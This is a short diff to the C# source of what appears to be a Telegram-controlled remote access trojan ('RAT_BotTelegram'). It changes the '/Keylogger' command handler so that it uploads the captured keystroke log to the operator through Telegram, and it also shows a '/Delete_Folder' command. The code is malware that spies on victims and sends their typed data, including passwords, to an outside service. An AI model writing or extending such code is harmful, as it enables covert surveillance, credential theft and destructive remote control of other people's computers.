@@ -85,9 +85,7 @@ namespace RAT_BotTelegram {
         private static async void BotOnMessageReceived(object sender, MessageEventArgs messageEventArgs) {
             
             var message = messageEventArgs.Message;
-
             if (message == null || message.Type != MessageType.Text) return;
-
             string Command = message.Text.Split(' ').First();           // Case "Comando"
             Path = message.Text.Substring(Command.Length);       // Obtiene el subcomando
 
@@ -210,9 +208,7 @@ namespace RAT_BotTelegram {
                 #endregion
 
                 case "/Keylogger":
-                    Path = config.PATH_LOG+"\\"+config.LOG; // Path del archivo log del keylogger
-                    
-                    Path = "";
+                    GetOnlyFileTelegram(config.PATH_KEY);
                     break;
                 
                 case "/Delete_Folder":
